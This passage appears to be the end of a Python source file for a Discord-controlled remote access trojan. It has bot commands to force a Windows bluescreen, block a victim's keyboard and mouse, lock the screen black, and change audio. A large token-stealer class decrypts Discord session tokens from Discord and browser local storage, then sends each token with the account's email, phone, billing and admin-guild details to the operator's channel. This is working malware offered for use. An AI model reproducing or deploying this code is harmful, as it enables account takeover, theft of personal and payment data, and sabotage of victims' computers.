# @bot.command(name='rickroll')
# async def rickroll(ctx):
#    if not in_correct_channel(ctx):
#        await wrong_channel(ctx)
#        return
#    working_message = await ctx.send("🎥 Preparing Rickroll...")

#    def run_video():
#        if not os.path.exists(VIDEO_PATH):
#            download_video(VIDEO_URL, VIDEO_PATH)
#        play_video()

# Start the video in a new thread
#    threading.Thread(target=run_video).start()
#
#    await working_message.delete()
#    await ctx.send("Rickroll is now playing! 🎶")

# Error handling
# @rickroll.error
# async def rickroll_error(ctx, error):
#    await ctx.send(f"⚠️ An error occurred: {error}", delete_after=10)

confirmation_pending = {}


@bot.command(name="bsod")
@commands.check(is_authorized)
async def bsod(ctx):
    if not in_correct_channel(ctx):
        await wrong_channel(ctx)
        return
    confirmation_pending[ctx.author.id] = True
    await ctx.send(
        "⚠️ Warning: You are about to trigger a Bluescreen! Type `!confirm_bsod` within 15 seconds to confirm."
    )

    # Schedule the removal of the confirmation after 30 seconds
    await asyncio.sleep(15)
    if confirmation_pending.get(ctx.author.id):
        confirmation_pending.pop(ctx.author.id, None)
        await ctx.send(
            "⏰ Confirmation timeout. Use `!bsod` to start the process again."
        )


@bot.command(name="confirm_bsod")
@commands.check(is_authorized)
async def confirm_bsod(ctx):
    if confirmation_pending.get(ctx.author.id):
        if not IS_WINDOWS:
            await ctx.send("❌ BSOD is only supported on Windows.")
            confirmation_pending.pop(ctx.author.id, None)
            return
        await ctx.send("Triggering Bluescreen now... 💀")
        ctypes.windll.ntdll.RtlAdjustPrivilege(19, 1, 0, ctypes.byref(ctypes.c_bool()))
        ctypes.windll.ntdll.NtRaiseHardError(
            0xC0000022, 0, 0, 0, 6, ctypes.byref(ctypes.c_ulong())
        )
    else:
        await ctx.send(
            "No pending Bluescreen confirmation. Use `!bsod` to start the process."
        )

    # Clear the pending confirmation
    confirmation_pending.pop(ctx.author.id, None)


bsod.error(generic_command_error)

confirm_bsod.error(generic_command_error)

input_blocked = False
keyboard_listener = None
mouse_listener = None


# Function to block user input
def block_input():
    global input_blocked, keyboard_listener, mouse_listener
    if not input_blocked:
        input_blocked = True
        keyboard_listener = keyboard.Listener(suppress=True)
        mouse_listener = mouse.Listener(suppress=True)
        keyboard_listener.start()
        mouse_listener.start()
        print("Input blocked.")


# Function to unblock user input
def unblock_input():
    global input_blocked, keyboard_listener, mouse_listener
    if input_blocked:
        input_blocked = False
        keyboard_listener.stop()
        mouse_listener.stop()
        print("Input unblocked.")


# Command to block or unblock input
@bot.command(name="input")
@commands.check(is_authorized)
async def input_command(ctx, action: str):
    if not in_correct_channel(ctx):
        await wrong_channel(ctx)
        return
    global input_blocked
    if action == "block":
        if input_blocked:
            msg = await ctx.send("❌ Input is already blocked.")
            await msg.delete(delay=5)
        else:
            block_input()
            await ctx.send(
                "🔒 Input has been blocked.\nTo unblock, use `!input unblock`. The only way to bypass this is to press `Ctrl + Alt + Delete`."
            )
    elif action == "unblock":
        if not input_blocked:
            msg = await ctx.send("❌ Input is already unblocked.")
            await msg.delete(delay=5)
        else:
            unblock_input()
            await ctx.send("🔓 Input has been unblocked.")
    else:
        msg = await ctx.send(
            "❌ Invalid action. Use `!input block` or `!input unblock`."
        )
        await msg.delete(delay=5)


input_command.error(generic_command_error)


def _linux_get_volume():
    """Return current volume (0-100) via pactl."""
    r = subprocess.run(
        ["pactl", "get-sink-volume", "@DEFAULT_SINK@"], capture_output=True, text=True
    )
    import re as _re

    m = _re.search(r"(\d+)%", r.stdout)
    return int(m.group(1)) if m else 0


def _linux_is_muted():
    r = subprocess.run(
        ["pactl", "get-sink-mute", "@DEFAULT_SINK@"], capture_output=True, text=True
    )
    return "yes" in r.stdout.lower()


def _linux_set_volume(pct):
    subprocess.run(["pactl", "set-sink-volume", "@DEFAULT_SINK@", f"{pct}%"])


def _linux_set_mute(mute: bool):
    subprocess.run(["pactl", "set-sink-mute", "@DEFAULT_SINK@", "1" if mute else "0"])


# Windows helper — only called when IS_WINDOWS
def get_default_audio_device():
    devices = AudioUtilities.GetSpeakers()
    interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
    return interface.QueryInterface(IAudioEndpointVolume)


# Command to control volume
@bot.command(name="volume")
@commands.check(is_authorized)
async def volume(ctx, *args):
    if not in_correct_channel(ctx):
        await wrong_channel(ctx)
        return

    if IS_WINDOWS:
        vol = get_default_audio_device()
        if not args:
            current_volume = int(vol.GetMasterVolumeLevelScalar() * 100)
            mute_status = "Muted 🔇" if vol.GetMute() else "Unmuted 🔊"
        elif args[0].isdigit():
            new_volume = int(args[0])
            if not 0 <= new_volume <= 100:
                msg = await ctx.send("❌ **Error:** Volume must be between 0 and 100.")
                await msg.delete(delay=10)
                return
            vol.SetMasterVolumeLevelScalar(new_volume / 100.0, None)
            await ctx.send(f"🔊 **Volume set to {new_volume}%**")
            return
        elif args[0] == "mute":
            if vol.GetMute():
                msg = await ctx.send("❌ **Error:** Already muted.")
                await msg.delete(delay=10)
                return
            vol.SetMute(1, None)
            await ctx.send("🔇 **Audio has been muted.**")
            return
        elif args[0] == "unmute":
            if not vol.GetMute():
                msg = await ctx.send("❌ **Error:** Already unmuted.")
                await msg.delete(delay=10)
                return
            vol.SetMute(0, None)
            await ctx.send("🔊 **Audio has been unmuted.**")
            return
        else:
            msg = await ctx.send("❌ **Error:** Invalid command.")
            await msg.delete(delay=10)
            return
    else:
        # Linux via pactl
        if not args:
            current_volume = _linux_get_volume()
            mute_status = "Muted 🔇" if _linux_is_muted() else "Unmuted 🔊"
        elif args[0].isdigit():
            new_volume = int(args[0])
            if not 0 <= new_volume <= 100:
                msg = await ctx.send("❌ **Error:** Volume must be between 0 and 100.")
                await msg.delete(delay=10)
                return
            _linux_set_volume(new_volume)
            await ctx.send(f"🔊 **Volume set to {new_volume}%**")
            return
        elif args[0] == "mute":
            if _linux_is_muted():
                msg = await ctx.send("❌ **Error:** Already muted.")
                await msg.delete(delay=10)
                return
            _linux_set_mute(True)
            await ctx.send("🔇 **Audio has been muted.**")
            return
        elif args[0] == "unmute":
            if not _linux_is_muted():
                msg = await ctx.send("❌ **Error:** Already unmuted.")
                await msg.delete(delay=10)
                return
            _linux_set_mute(False)
            await ctx.send("🔊 **Audio has been unmuted.**")
            return
        else:
            msg = await ctx.send("❌ **Error:** Invalid command.")
            await msg.delete(delay=10)
            return

    # No-args info message (both platforms reach here)
    await ctx.send(
        f"🎵 **Audio Device Info:**\n"
        f"Current Volume: {current_volume}%\n"
        f"Status: {mute_status}\n\n"
        f"**Usage:**\n"
        f"`!volume [0-100]` - Set volume\n"
        f"`!volume mute` / `!volume unmute` - Toggle mute"
    )


# Variable to store the black screen window
black_screen_window = None


# Function to turn on the black screen
def blackscreen_on():
    global black_screen_window
    if black_screen_window is None:
        black_screen_window = tk.Tk()
        black_screen_window.attributes("-fullscreen", True)
        black_screen_window.configure(bg="black")
        black_screen_window.bind("<Escape>", lambda e: None)  # Disable Escape key
        black_screen_window.protocol(
            "WM_DELETE_WINDOW", lambda: None
        )  # Disable window close button
        black_screen_window.attributes(
            "-topmost", True
        )  # Make sure the window is always on top
        black_screen_window.config(cursor="none")
        black_screen_window.mainloop()


# Function to turn off the black screen
def blackscreen_off():
    global black_screen_window
    if black_screen_window is not None:
        black_screen_window.destroy()
        black_screen_window = None


# Function to send a temporary message
async def send_temporary_message(ctx, message, duration=10):
    msg = await ctx.send(message)
    await asyncio.sleep(duration)
    await msg.delete()


# Command to manage black screen
@bot.command(name="blackscreen")
@commands.check(is_authorized)
async def blackscreen(ctx, action: str = None):
    if not in_correct_channel(ctx):
        await send_temporary_message(
            ctx,
            "This command can only be used in the specific channel for this PC.",
            duration=10,
        )
        return

    if action is None:
        await send_temporary_message(
            ctx, "❌ **Error:** No argument provided. Use `on` or `off`.", duration=10
        )
        return

    if action.lower() == "on":
        if black_screen_window is not None:
            await send_temporary_message(
                ctx, "❌ **Error:** The black screen is already on.", duration=10
            )
        else:
            turning_on_msg = await ctx.send("🖥️ **Turning on the black screen...**")
            threading.Thread(target=blackscreen_on, daemon=True).start()
            await turning_on_msg.delete()
            await ctx.send("✅ **Black screen is now on.**")
    elif action.lower() == "off":
        if black_screen_window is None:
            await send_temporary_message(
                ctx, "❌ **Error:** The black screen is not on.", duration=10
            )
        else:
            turning_off_msg = await ctx.send("🖥️ **Turning off the black screen...**")
            threading.Thread(target=blackscreen_off, daemon=True).start()
            await turning_off_msg.delete()
            await ctx.send("✅ **Black screen is now off.**")
    else:
        await send_temporary_message(
            ctx, "❌ **Error:** Invalid argument. Use `on` or `off`.", duration=10
        )


blackscreen.error(generic_command_error)


class grab_discord:
    def initialize(self, raw_data):
        return fetch_tokens().upload(raw_data)


class extract_tokens:
    def __init__(self) -> None:
        self.base_url = "https://discord.com/api/v9/users/@me"
        self.appdata = os.getenv("localappdata")
        self.roaming = os.getenv("appdata")
        self.regexp = r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}"
        self.regexp_enc = r"dQw4w9WgXcQ:[^\"]*"
        self.tokens, self.uids = [], []
        self.extract()

    def extract(self) -> None:
        paths = {
            "Discord": self.roaming + "\\discord\\Local Storage\\leveldb\\",
            "Discord Canary": self.roaming
            + "\\discordcanary\\Local Storage\\leveldb\\",
            "Lightcord": self.roaming + "\\Lightcord\\Local Storage\\leveldb\\",
            "Discord PTB": self.roaming + "\\discordptb\\Local Storage\\leveldb\\",
            "Opera": self.roaming
            + "\\Opera Software\\Opera Stable\\Local Storage\\leveldb\\",
            "Opera GX": self.roaming
            + "\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb\\",
            "Amigo": self.appdata + "\\Amigo\\User Data\\Local Storage\\leveldb\\",
            "Torch": self.appdata + "\\Torch\\User Data\\Local Storage\\leveldb\\",
            "Kometa": self.appdata + "\\Kometa\\User Data\\Local Storage\\leveldb\\",
            "Orbitum": self.appdata + "\\Orbitum\\User Data\\Local Storage\\leveldb\\",
            "CentBrowser": self.appdata
            + "\\CentBrowser\\User Data\\Local Storage\\leveldb\\",
            "7Star": self.appdata
            + "\\7Star\\7Star\\User Data\\Local Storage\\leveldb\\",
            "Sputnik": self.appdata
            + "\\Sputnik\\Sputnik\\User Data\\Local Storage\\leveldb\\",
            "Vivaldi": self.appdata
            + "\\Vivaldi\\User Data\\Default\\Local Storage\\leveldb\\",
            "Chrome SxS": self.appdata
            + "\\Google\\Chrome SxS\\User Data\\Local Storage\\leveldb\\",
            "Chrome": self.appdata
            + "\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\",
            "Chrome1": self.appdata
            + "\\Google\\Chrome\\User Data\\Profile 1\\Local Storage\\leveldb\\",
            "Chrome2": self.appdata
            + "\\Google\\Chrome\\User Data\\Profile 2\\Local Storage\\leveldb\\",
            "Chrome3": self.appdata
            + "\\Google\\Chrome\\User Data\\Profile 3\\Local Storage\\leveldb\\",
            "Chrome4": self.appdata
            + "\\Google\\Chrome\\User Data\\Profile 4\\Local Storage\\leveldb\\",
            "Chrome5": self.appdata
            + "\\Google\\Chrome\\User Data\\Profile 5\\Local Storage\\leveldb\\",
            "Epic Privacy Browser": self.appdata
            + "\\Epic Privacy Browser\\User Data\\Local Storage\\leveldb\\",
            "Microsoft Edge": self.appdata
            + "\\Microsoft\\Edge\\User Data\\Default\\Local Storage\\leveldb\\",
            "Uran": self.appdata
            + "\\uCozMedia\\Uran\\User Data\\Default\\Local Storage\\leveldb\\",
            "Yandex": self.appdata
            + "\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb\\",
            "Brave": self.appdata
            + "\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb\\",
            "Iridium": self.appdata
            + "\\Iridium\\User Data\\Default\\Local Storage\\leveldb\\",
        }

        for name, path in paths.items():
            if not os.path.exists(path):
                continue
            _discord = name.replace(" ", "").lower()
            if "cord" in path:
                if not os.path.exists(self.roaming + f"\\{_discord}\\Local State"):
                    continue
                for file_name in os.listdir(path):
                    if file_name[-3:] not in ["log", "ldb"]:
                        continue
                    for line in [
                        x.strip()
                        for x in open(
                            f"{path}\\{file_name}", errors="ignore"
                        ).readlines()
                        if x.strip()
                    ]:
                        for y in re.findall(self.regexp_enc, line):
                            token = self.decrypt_val(
                                base64.b64decode(y.split("dQw4w9WgXcQ:")[1]),
                                self.get_master_key(
                                    self.roaming + f"\\{_discord}\\Local State"
                                ),
                            )

                            if self.validate_token(token):
                                uid = requests.get(
                                    self.base_url, headers={"Authorization": token}
                                ).json()["id"]
                                if uid not in self.uids:
                                    self.tokens.append(token)
                                    self.uids.append(uid)

            else:
                for file_name in os.listdir(path):
                    if file_name[-3:] not in ["log", "ldb"]:
                        continue
                    for line in [
                        x.strip()
                        for x in open(
                            f"{path}\\{file_name}", errors="ignore"
                        ).readlines()
                        if x.strip()
                    ]:
                        for token in re.findall(self.regexp, line):
                            if self.validate_token(token):
                                uid = requests.get(
                                    self.base_url, headers={"Authorization": token}
                                ).json()["id"]
                                if uid not in self.uids:
                                    self.tokens.append(token)
                                    self.uids.append(uid)

        if os.path.exists(self.roaming + "\\Mozilla\\Firefox\\Profiles"):
            for path, _, files in os.walk(
                self.roaming + "\\Mozilla\\Firefox\\Profiles"
            ):
                for _file in files:
                    if not _file.endswith(".sqlite"):
                        continue
                    for line in [
                        x.strip()
                        for x in open(f"{path}\\{_file}", errors="ignore").readlines()
                        if x.strip()
                    ]:
                        for token in re.findall(self.regexp, line):
                            if self.validate_token(token):
                                uid = requests.get(
                                    self.base_url, headers={"Authorization": token}
                                ).json()["id"]
                                if uid not in self.uids:
                                    self.tokens.append(token)
                                    self.uids.append(uid)

    def validate_token(self, token: str) -> bool:
        r = requests.get(self.base_url, headers={"Authorization": token})
        if r.status_code == 200:
            return True
        return False

    def decrypt_val(self, buff: bytes, master_key: bytes) -> str:
        iv = buff[3:15]
        payload = buff[15:]
        cipher = AES.new(master_key, AES.MODE_GCM, iv)
        decrypted_pass = cipher.decrypt(payload)
        decrypted_pass = decrypted_pass[:-16].decode()
        return decrypted_pass

    def get_master_key(self, path: str) -> str:
        if not IS_WINDOWS:
            return None
        if not os.path.exists(path):
            return
        if "os_crypt" not in open(path, "r", encoding="utf-8").read():
            return
        with open(path, "r", encoding="utf-8") as f:
            c = f.read()
        local_state = json.loads(c)
        master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        master_key = master_key[5:]
        master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
        return master_key


class fetch_tokens:
    def __init__(self):
        self.tokens = extract_tokens().tokens

    def upload(self, raw_data):
        if not self.tokens:
            return ["No tokens found."]  # Return a message if no tokens are found

        final_to_return = []
        for token in self.tokens:
            try:
                user_response = requests.get(
                    "https://discord.com/api/v8/users/@me",
                    headers={"Authorization": token},
                )
                user_response.raise_for_status()  # Raise an error for bad responses
                user_data = user_response.json()

                # Fetch billing information
                billing_response = requests.get(
                    "https://discord.com/api/v6/users/@me/billing/payment-sources",
                    headers={"Authorization": token},
                )
                billing_response.raise_for_status()
                billing_data = billing_response.json()

                # Fetch guilds
                guilds_response = requests.get(
                    "https://discord.com/api/v9/users/@me/guilds?with_counts=true",
                    headers={"Authorization": token},
                )
                guilds_response.raise_for_status()
                guilds_data = guilds_response.json()

                # Prepare user information
                username = user_data["username"] + "#" + user_data["discriminator"]
                user_id = user_data["id"]
                email = user_data.get("email", "None")
                phone = user_data.get("phone", "None")
                mfa = user_data["mfa_enabled"]
                avatar = (
                    f"https://cdn.discordapp.com/avatars/{user_id}/{user_data['avatar']}.png"
                    if user_data["avatar"]
                    else None
                )

                # Determine Nitro status
                nitro = {
                    0: "None",
                    1: "Nitro Classic",
                    2: "Nitro",
                    3: "Nitro Basic",
                }.get(user_data["premium_type"], "None")

                # Prepare billing information
                payment_methods = (
                    ", ".join(method["type"] for method in billing_data)
                    if billing_data
                    else "None"
                )

                # Prepare guild information
                hq_guilds = []
                for guild in guilds_data:
                    admin = int(guild["permissions"]) & 0x8 != 0
                    if admin and guild["approximate_member_count"] >= 100:
                        invite = (
                            "https://discord.gg/example"  # Placeholder for invite link
                        )
                        data = f"**{guild['name']} ({guild['id']})** | Members: `{guild['approximate_member_count']}`"
                        hq_guilds.append(data)

                hq_guilds = "\n".join(hq_guilds) if hq_guilds else "None"

                # Create embed message
                if not raw_data:
                    embed = Embed(title=f"{username} ({user_id})", color=0x0084FF)
                    embed.set_thumbnail(url=avatar)
                    embed.add_field(
                        name="📜 Token:", value=f"```{token}```", inline=False
                    )
                    embed.add_field(name="💎 Nitro:", value=nitro, inline=False)
                    embed.add_field(
                        name="💳 Billing:", value=payment_methods, inline=False
                    )
                    embed.add_field(name="🔒 MFA:", value=mfa, inline=False)
                    embed.add_field(name="📧 Email:", value=email, inline=False)
                    embed.add_field(name="📳 Phone:", value=phone, inline=False)
                    embed.add_field(name="🏰 HQ Guilds:", value=hq_guilds, inline=False)
                    final_to_return.append(embed)
                else:
                    final_to_return.append(
                        json.dumps(
                            {
                                "username": username,
                                "token": token,
                                "nitro": nitro,
                                "billing": payment_methods,
                                "mfa": mfa,
                                "email": email,
                                "phone": phone,
                                "hq_guilds": hq_guilds,
                            }
                        )
                    )

            except requests.exceptions.HTTPError as http_err:
                print(f"HTTP error occurred: {http_err}")  # Log the HTTP error
                final_to_return.append(f"Error retrieving user data: {http_err}")
            except Exception as err:
                print(f"An error occurred: {err}")  # Log any other errors
                final_to_return.append(f"An error occurred: {err}")

        return final_to_return  # Return the final data


async def long_running_task(ctx, raw_data):
    tokens_grabber = grab_discord()
    extracted_data = tokens_grabber.initialize(raw_data)  # Get the extracted data

    if extracted_data:
        for data in extracted_data:
            await ctx.send(embed=data)  # Send each embed to the chat
        await ctx.send(
            "✅ Tokens have been successfully extracted and sent!"
        )  # Success message
    else:
        await ctx.send("No Data found.")  # Message if no data is found


@bot.command(name="grab_discord")
@commands.check(is_authorized)
async def grab_tokens(ctx):
    if not in_correct_channel(ctx):
        await wrong_channel(ctx)
        return

    if not IS_WINDOWS:
        await log_message(
            ctx, "❌ Token grabbing is only supported on Windows.", duration=10
        )
        return
    loading_message = await ctx.send("🔄 Extracting Discord tokens...")
    try:
        raw_data = False
        asyncio.create_task(long_running_task(ctx, raw_data))
    except Exception as e:
        await log_message(ctx, f"Error whilst extracting tokens: {str(e)}", duration=10)


def main():
    time.sleep(8)
    load_admin_status()
    check_single_instance()


if __name__ == "__main__":
    main()
bot.run(TOKEN)
